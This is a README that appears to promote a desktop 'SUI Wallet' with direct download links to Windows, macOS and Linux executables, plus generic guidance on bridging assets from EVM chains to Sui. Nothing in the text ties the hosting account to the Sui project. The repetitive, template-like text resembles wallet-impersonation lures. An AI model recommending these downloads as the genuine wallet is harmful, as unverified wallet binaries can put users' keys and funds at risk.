![SUI Wallet](assets/banner-hub.png)

# SUI Wallet EVM bridge

Move value between an EVM chain and Sui from an account whose keys never leave your machine.

[![License: Apache-2.0](https://img.shields.io/badge/LICENSE-Apache--2.0-4DA2FF?style=for-the-badge&labelColor=0D1117)](#license)

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

## What this repository is for

Most people meet Sui with a balance already somewhere else. The bridge is the part of that journey where value leaves one chain's custody and arrives in another's, and it is the step where a reader is least able to check what happened afterwards.

This repository is the project's home for that route. It documents how an EVM asset and a Sui asset are related across a transfer, what the wallet can show you before you commit, and where the trust actually sits: a bridge is a third party, the destination chain's address format is not the source's, and a transfer that lands on the wrong chain is not a wallet bug. Every page here is written so a reader can tell those three cases apart before money moves rather than after.

The guides do not re-explain the wallet. They assume a running SUI Wallet installation, a recovery phrase already recorded, and an account with something in it, and they point back to the two guide repositories that cover those steps when a reader has skipped one of them.

Nothing in this repository publishes a rate, a fee schedule or a promise about how long a transfer takes. Those belong to whichever bridge or venue the reader chooses, and a page here that invented one would be wrong within a week.

## Who it is for

- Someone holding value on an EVM chain who wants it usable inside a Sui wallet.
- A reader who has Bridged once already and cannot tell which side of the route went wrong.
- Anyone who wants to know what the wallet can show before a cross-chain transfer is signed.

## Start here

1. [Moving assets between EVM chains and Sui](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/moving-assets-between-evm-and-sui.md) - Two chains, two address formats, and a bridge that is a third party.
2. [Understanding the Sui blockchain](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/understanding-the-sui-blockchain.md) - Objects, epochs and a Move-based execution model, in the order a wallet user meets them.
3. [Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) - The approval screen is the last place a bad transaction can be stopped.
4. [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) - Address, amount, fee, approval: the four things to check before a transfer leaves.

## How to use these guides

1. Confirm the wallet is installed, the recovery phrase written down, and one account funded; the install and backup guides cover each of those once and neither is repeated here.
2. Read the route before you send: which chain the asset starts on, which bridge carries it, and which address receives it on Sui.
3. Watch the approval preview for the Sui side of the result, because it is the only screen that shows what the wallet will do with the value arriving.
4. Keep the transfer digest. A cross-chain transfer that looks stuck is almost always waiting on the second chain rather than lost.

## The guides grouped

| Guide | What it answers |
| --- | --- |
| [Moving assets between EVM chains and Sui](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/moving-assets-between-evm-and-sui.md) | Move value between an EVM chain and Sui and understand where the trust sits in that route. |
| [Understanding the Sui blockchain](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/understanding-the-sui-blockchain.md) | Explain the Sui blockchain in the terms a wallet user needs: objects, epochs, gas and finality. |
| [Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) | Read a signature request before approving it and understand what revoking a connection does and does not do. |
| [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) | Send SUI to another address and read the preview that appears before you approve the transfer. |

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Two chains | [Moving assets between EVM chains and Sui](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/moving-assets-between-evm-and-sui.md) | Move value between an EVM chain and Sui and understand where the trust sits in that route. |
| Objects | [Understanding the Sui blockchain](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/understanding-the-sui-blockchain.md) | Explain the Sui blockchain in the terms a wallet user needs: objects, epochs, gas and finality. |
| The approval screen is the last place a bad transaction can be stopped. | [Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) | Read a signature request before approving it and understand what revoking a connection does and does not do. |
| Address | [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) | Send SUI to another address and read the preview that appears before you approve the transfer. |

## Common first questions

### Does the wallet bridge the assets itself?

No. The route between chains runs through a bridge, which is a third party, and the wallet handles the Sui side of the result. The guide is explicit about that boundary because it is the one readers most often assume away.

### Can I send to the same address on both chains?

The address formats differ, so an EVM address is not a Sui address and a transfer that treats them as interchangeable does not arrive. Read the destination from the receiving wallet on Sui rather than reusing the one you had.

### Where do the wallet guides live?

Install and repair sit in one repository, keys and login in a second, and transfers, staking and sign-in in a third. Each page here links the one it depends on instead of repeating it.

## Before you start

Check the receiving address on Sui with that wallet open on screen, because the EVM address you are coming from does not exist on both chains. A route whose destination is wrong has no way back.

## About

This repository belongs to the same account as the desktop application and the other guide sets: [install and repair](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting), [keys and login](https://github.com/sui-blockchain-wallet/key-safety-and-login), [transfers and staking](https://github.com/sui-blockchain-wallet/onchain-transfer-guides) and [the bridge](https://github.com/sui-blockchain-wallet/evm-sui), with [the profile repository](https://github.com/sui-blockchain-wallet) as the index. The wallet is actively maintained and the release page is its only distribution channel.

## License

Apache License 2.0. The full text sits in the application repository's [licence file](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/blob/HEAD/LICENSE) and a copy ships at the root of this repository.

---

This page describes a desktop wallet that keeps keys on the reader's own machine. A bridge is a third party, and nothing here rates an asset or forecasts how long a route takes.
